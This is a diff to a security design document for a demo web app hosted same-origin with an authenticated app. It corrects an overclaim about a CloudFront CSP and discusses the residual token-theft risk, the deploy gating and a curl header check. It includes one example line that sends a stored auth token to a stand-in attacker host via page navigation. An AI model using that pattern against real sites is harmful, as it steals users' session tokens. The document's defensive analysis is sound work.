@@ -247,19 +247,41 @@ same-origin under `/ark_demo/`, so a relative path resolves through CloudFront i
 wherever the bundle is hosted (prod, stag, or a local preview), and it survives a domain change.
 An absolute form would silently point a stag-hosted or locally-previewed demo's downloads at prod.
 
-#### `/ark_demo/*` origin isolation (same-origin hosting)
+#### `/ark_demo/*` same-origin hosting (and its residual risk)
 
 The demo SPA itself (everything under `/ark_demo/` that isn't a downloadable bundle — the built
 `flip-ui` demo bundle, uploaded to the **same** `FLIP_UI_BUCKET_NAME` bucket under an `ark_demo/`
 prefix) shares an origin with the real, authenticated app. That means a real signed-in user's
-Cognito tokens in `localStorage` are technically reachable by any JS running under
-`app.flip.aicentre.co.uk` — including a hypothetical XSS bug in the demo bundle. Rather than move
-the demo to a separate subdomain, the mitigation is a dedicated, **enforcing** (not report-only)
-`aws_cloudfront_response_headers_policy.ark_demo_spa` attached only to the `/ark_demo/*` behaviour:
-`connect-src 'none'` blocks every fetch/XHR/WebSocket the page could make, so even if a token were
-read from `localStorage` there is nowhere on the network to send it. The demo's Mirage mock server
-never touches the real browser network stack (it replaces `XMLHttpRequest`/`fetch` outright), so
-this has no effect on demo functionality — confirmed by the original PR's Chrome net-log audit.
+Cognito tokens in `localStorage` are reachable by any JS running under `app.flip.aicentre.co.uk` —
+including a hypothetical script-injection bug in the demo bundle. Rather than move the demo to a
+separate subdomain, it is served behind a dedicated, **enforcing** (not report-only)
+`aws_cloudfront_response_headers_policy.ark_demo_spa` attached only to the `/ark_demo/*` behaviour.
+
+> **This CSP is defence in depth, not an origin boundary.** An earlier version of this section
+> claimed `connect-src 'none'` meant a leaked token had "nowhere on the network to go". That is not
+> correct and was fixed in review (FLIP#794): **CSP has no directive governing top-level
+> navigation** — `navigate-to` was dropped from CSP3 and ships in no browser, and `form-action`
+> covers form submission only — so `location.href = "https://evil/?t=" + token` is unaffected by
+> this policy. Same-origin hosting also grants the demo full read access to the real app's
+> `localStorage` and cookies regardless of any CSP; `connect-src` constrains where a page may
+> *connect*, not what it may *read*.
+>
+> **The residual risk is real and accepted.** What keeps it closed today is that the demo has no
+> injection sink (no `v-html`/`innerHTML` outside a test file) and serves a static register compiled
+> into the bundle rather than attacker-supplied input — not the CSP. **A separate origin (e.g.
+> `demo.flip.aicentre.co.uk`) is the only control that genuinely separates the two token stores.**
+> Treat moving to one as the fix if the demo ever grows a dynamic content path.
+
+What the policy *does* buy is worth keeping: it blocks the entire fetch/XHR/WebSocket exfiltration
+class and every third-party resource load, and it enforces the "zero egress" property the demo
+design rests on. The demo's Mirage mock server never touches the real browser network stack (it
+replaces `XMLHttpRequest`/`fetch` outright), so this costs no demo functionality — confirmed by the
+original PR's Chrome net-log audit and pinned by the `zero egress` cases in
+`flip-ui/mocks/__tests__/demo-server.spec.ts`.
+
+Note the demo enforces `style-src 'self'` while the real app still runs that policy report-only, and
+CodeMirror injects an inline `<style>` at runtime on the cohort-query page — worth an eyeball on
+that page before a public launch.
 
 Three ordered behaviours now exist for the demo, evaluated in this precedence order (CloudFront
 uses the first `path_pattern` match, so order matters):
@@ -273,10 +295,12 @@ The shared `spa_rewrite` CloudFront Function (attached to both the default behav
 never the real app's `/index.html` — the earlier version would have silently served the real
 (Cognito-gated) app for a demo URL.
 
-This CSP is the origin-isolation control end-to-end — if `ark_demo_spa` ever gets detached from the
-`/ark_demo/*` behaviour (Terraform drift, a future refactor), the isolation vanishes with **no
-functional symptom**, since the demo works identically without it. Add this check alongside the
-200/403 verification pair above whenever the demo is (re)deployed:
+If `ark_demo_spa` ever gets detached from the `/ark_demo/*` behaviour (Terraform drift, a future
+refactor), that hardening vanishes with **no functional symptom**, since the demo works identically
+without it. `make deploy-ark-demo` now refuses to publish when `DEMO_ASSETS_BUCKET_NAME` is unset or
+when the live distribution has no `/ark_demo/*` behaviour — the variable gates both the behaviour
+and its CSP, and without it the demo would be served by the *default* behaviour, whose CSP is only
+report-only. Still verify after a (re)deploy, alongside the 200/403 pair above:
 
 ```bash
 curl -sI https://app.flip.aicentre.co.uk/ark_demo/ | grep -i content-security-policy   # expect: connect-src 'none' present
